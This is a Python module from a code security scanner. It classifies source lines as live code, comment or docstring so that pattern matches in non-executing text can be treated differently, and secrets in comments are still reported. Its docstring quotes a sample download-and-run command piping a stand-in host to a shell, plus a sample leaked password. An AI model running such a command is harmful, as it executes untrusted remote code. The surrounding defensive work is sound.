"""
Lexical context of a source line: is a match live code, or is it being TALKED ABOUT?

WHY THIS EXISTS
---------------
PRAETOR's dominant false-positive class is pattern-presence in text that never
executes: a `curl | sh` inside a code comment explaining the attack, a threat
described in a docstring, an example in prose. Measured on PRAETOR's own repo,
every one of 47 self-scan findings was of this kind (references/SELF-SCAN-BASELINE.json).

This module answers one narrow question -- what KIND of text is this line? --
and nothing else. It is pure: text in, label out, no file I/O and no policy.
The decision about which contexts justify suppression lives with the caller,
because that decision differs per engine and is the dangerous half.

🔴 THE DISTINCTION THAT MAKES THIS SAFE, AND IT IS NOT SYMMETRIC
----------------------------------------------------------------
A BEHAVIOURAL pattern in a comment is inert -- the comment cannot exec anything.
A SECRET in a comment is still a leaked secret. The credential is disclosed by
being written down, not by being executed:

    # password = "hunter2"        <- STILL A LEAK. Never suppress this.
    # curl evil.example | sh      <- inert. Safe to suppress.

So this module never suppresses anything itself, and callers must not apply it
to secret findings. `tests/test_lexctx_and_suppression_policy.py` holds that line
-- specifically `test_secret_in_a_comment_is_NEVER_suppressed`, which calls the
real `praetor._apply_lexical_context` rather than inspecting its config.

⚠️ DELIBERATELY NOT IMPLEMENTED: "the match is inside a collection literal."
That predicate is true of PRAETOR's own rule tables, and it is ALSO true of
`API_KEYS = ["sk-ant-…"]` in someone else's code. It is safe as a
PRAETOR-self-scan classification and unsafe as a general engine rule. It stays
in tools/classify_baseline.py and does not come here.
"""

from __future__ import annotations

# The ONLY import, and it is deliberate: `split_lines` is the toolchain's single
# definition of a line. This module stays pure -- text in, label out, no I/O and
# no policy -- and importing a pure helper does not change that.
from core import split_lines

CODE = "code"
COMMENT = "comment"
DOCSTRING = "docstring"

_TRIPLES = ('"""', "'''")


def _strip_inline_strings(line: str) -> str:
    """
    Blank out single-line string literals so their contents cannot be mistaken
    for comment markers (and vice versa). Crude but predictable: it walks the
    line tracking one quote char at a time.
    """
    out, quote, i = [], None, 0
    while i < len(line):
        ch = line[i]
        if quote:
            out.append(" ")
            if ch == quote and line[i - 1 : i] != "\\":
                quote = None
        elif ch in ("'", '"'):
            quote = ch
            out.append(" ")
        else:
            out.append(ch)
        i += 1
    return "".join(out)


#: Comment introducers recognised by `comment_text`. 🔴 DELIBERATELY CONSERVATIVE.
#: This list decides where a SUPPRESSION marker is allowed to live, so the unsafe
#: direction here is recognising TOO MANY things as comments -- an over-generous
#: entry (`--`, `;`, `%`, `'`) would let an ordinary expression or a quoted value
#: introduce a "comment" and suppress a real finding.
#:
#: ⚠️ STATED IN FULL rather than implied: a marker written in SQL (`-- nosec`),
#: ini/asm (`; nosec`), MATLAB/TeX (`% nosec`) or VB (`' nosec`) is NOT honoured
#: and the finding is KEPT. That is the safe direction, and it is the whole
#: reason those are absent.
COMMENT_INTRODUCERS = ("#", "//", "/*", "<!--")


def comment_text(line: str, introducers=COMMENT_INTRODUCERS) -> str:
    """Return the COMMENT portion of a single line, or "" if it has none.

    String literals are blanked first, so a marker inside a string -- `x = "# nosec"`,
    or a JSON value, or a key named `"nosec_note"` -- is not mistaken for a comment.
    That distinction is the entire point: a file format with no comment syntax at
    all (JSON) must not be able to carry a suppression marker.
    """
    bare = _strip_inline_strings(line)
    first = None
    for intro in introducers:
        idx = bare.find(intro)
        if idx != -1 and (first is None or idx < first):
            first = idx
    return "" if first is None else bare[first:]


def classify_lines(text: str, comment_prefixes=("#",)) -> list:
    """
    Return a per-line context label for `text` (1 label per line, index 0 = line 1).

    Handles the two structures that actually matter for this scanner's noise:
      * whole-line and trailing `#` comments
      * triple-quoted blocks (treated as DOCSTRING wherever they appear)

    ⚠️ Approximate by construction, in the SAFE direction: anything it cannot
    confidently prove is inert is labelled CODE, so an unclear case is KEPT
    rather than suppressed. Nested/escaped exotica resolves to CODE.
    """
    labels, in_triple, delim = [], False, None

    # 🔴 split_lines, never str.splitlines. This list is indexed BY LINE NUMBER
    # by the caller, so a disagreement about what a line is relabels live code as
    # a comment or docstring -- and callers suppress on that label. See
    # core.split_lines for the concrete bypass.
    for raw in split_lines(text):
        if in_triple:
            labels.append(DOCSTRING)
            if delim in raw:
                in_triple, delim = False, None
            continue

        stripped = raw.strip()

        opened = None
        for t in _TRIPLES:
            if t in raw:
                opened = t
                break

        if opened is not None:
            # A triple-quote that opens and closes on the same line is a
            # one-line docstring/string; it does not change block state.
            if raw.count(opened) >= 2:
                labels.append(DOCSTRING if stripped.startswith(opened) else CODE)
                continue
            labels.append(DOCSTRING if stripped.startswith(opened) else CODE)
            in_triple, delim = True, opened
            continue

        if any(stripped.startswith(p) for p in comment_prefixes):
            labels.append(COMMENT)
            continue

        # Trailing comment: only if the marker survives string-stripping.
        bare = _strip_inline_strings(raw)
        if any(p in bare for p in comment_prefixes):
            labels.append(COMMENT)
            continue

        labels.append(CODE)

    return labels


def context_of(text: str, lineno: int, comment_prefixes=("#",)) -> str:
    """Context label for a single 1-based line. Out-of-range resolves to CODE."""
    labels = classify_lines(text, comment_prefixes)
    if not (1 <= lineno <= len(labels)):
        return CODE
    return labels[lineno - 1]
